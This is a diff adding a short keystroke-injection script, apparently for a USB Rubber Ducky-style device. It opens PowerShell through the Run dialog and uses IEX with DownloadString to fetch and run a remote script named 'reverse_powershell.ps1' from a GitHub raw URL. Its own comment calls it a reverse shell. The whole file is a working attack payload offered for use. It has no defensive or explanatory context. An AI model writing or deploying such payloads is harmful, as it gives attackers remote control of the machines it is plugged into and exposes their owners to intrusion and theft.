@@ -1,0 +1,9 @@
+REM Open PowerShell and execute the reverse shell script
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/networkdavit/powershell_scripts/refs/heads/main/reverse_powershell.ps1');
+ENTER
